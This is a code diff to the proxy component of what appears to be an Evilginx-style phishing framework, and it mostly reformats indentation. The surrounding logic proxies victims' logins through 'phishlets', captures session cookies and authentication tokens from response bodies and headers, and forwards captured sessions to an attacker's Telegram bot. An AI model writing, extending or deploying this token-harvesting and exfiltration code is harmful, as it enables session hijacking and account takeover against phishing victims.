@@ -214,7 +214,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			req_path := req.URL.Path
 			if req.URL.RawQuery != "" {
 				req_url += "?" + req.URL.RawQuery
-				//req_path += "?" + req.URL.RawQuery
+				// Keep req_path as base path without query parameters
 			}
 
 			pl := p.getPhishletByPhishHost(req.Host)
@@ -1024,7 +1024,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ok && (s.IsAuthUrl || !s.IsDone) {
 							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
-								
+
 								// Check if this is a new cookie token
 								isNewToken := true
 								if domainTokens, exists := s.CookieTokens[c_domain]; exists {
@@ -1032,9 +1032,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										isNewToken = false
 									}
 								}
-								
+
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
-								
+
 								// Send telegram update notification if new cookie token was captured
 								if isNewToken && p.cfg.GetTelegramEnabled() && p.cfg.GetTelegramBotToken() != "" && p.cfg.GetTelegramChatId() != "" {
 									log.Debug("[%d] captured cookie token: %s", ps.Index, ck.Name)
@@ -1061,45 +1061,45 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
-											// capture body response tokens
-						tokenCaptured := false
-						for k, v := range pl.bodyAuthTokens {
-							if _, ok := s.BodyTokens[k]; !ok {
-								//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
-								if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-									//log.Debug("RESPONSE body = %s", string(body))
-									token_re := v.search.FindStringSubmatch(string(body))
-									if token_re != nil && len(token_re) >= 2 {
-										s.BodyTokens[k] = token_re[1]
-										s.UpdateTokenTimestamp() // Update timestamp for Telegram notifications
-										tokenCaptured = true
-										log.Debug("[%d] captured body token: %s", ps.Index, k)
-									}
-								}
-							}
-						}
-
-						// capture http header tokens
-						for k, v := range pl.httpAuthTokens {
-							if _, ok := s.HttpTokens[k]; !ok {
-								hv := resp.Request.Header.Get(v.header)
-								if hv != "" {
-									s.HttpTokens[k] = hv
+					// capture body response tokens
+					tokenCaptured := false
+					for k, v := range pl.bodyAuthTokens {
+						if _, ok := s.BodyTokens[k]; !ok {
+							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
+								//log.Debug("RESPONSE body = %s", string(body))
+								token_re := v.search.FindStringSubmatch(string(body))
+								if token_re != nil && len(token_re) >= 2 {
+									s.BodyTokens[k] = token_re[1]
 									s.UpdateTokenTimestamp() // Update timestamp for Telegram notifications
 									tokenCaptured = true
-									log.Debug("[%d] captured http token: %s", ps.Index, k)
+									log.Debug("[%d] captured body token: %s", ps.Index, k)
 								}
 							}
 						}
+					}
 
-						// Send telegram update notification if new tokens were captured
-						if tokenCaptured && p.cfg.GetTelegramEnabled() && p.cfg.GetTelegramBotToken() != "" && p.cfg.GetTelegramChatId() != "" {
-							p.telegram.Setup(p.cfg.GetTelegramBotToken(), p.cfg.GetTelegramChatId())
-							err := p.telegram.SendSessionNotification(s, ps.Index, ps.PhishletName, p.cfg.GetConfigDir())
-							if err != nil {
-								log.Error("telegram token update: %s", err)
+					// capture http header tokens
+					for k, v := range pl.httpAuthTokens {
+						if _, ok := s.HttpTokens[k]; !ok {
+							hv := resp.Request.Header.Get(v.header)
+							if hv != "" {
+								s.HttpTokens[k] = hv
+								s.UpdateTokenTimestamp() // Update timestamp for Telegram notifications
+								tokenCaptured = true
+								log.Debug("[%d] captured http token: %s", ps.Index, k)
 							}
 						}
+					}
+
+					// Send telegram update notification if new tokens were captured
+					if tokenCaptured && p.cfg.GetTelegramEnabled() && p.cfg.GetTelegramBotToken() != "" && p.cfg.GetTelegramChatId() != "" {
+						p.telegram.Setup(p.cfg.GetTelegramBotToken(), p.cfg.GetTelegramChatId())
+						err := p.telegram.SendSessionNotification(s, ps.Index, ps.PhishletName, p.cfg.GetConfigDir())
+						if err != nil {
+							log.Error("telegram token update: %s", err)
+						}
+					}
 				}
 
 				// check if we have all tokens
@@ -1975,13 +1975,13 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
-	
+
 	// Start web dashboard
 	err := p.webServer.Start()
 	if err != nil {
 		log.Error("failed to start web server: %v", err)
 	}
-	
+
 	return nil
 }
 
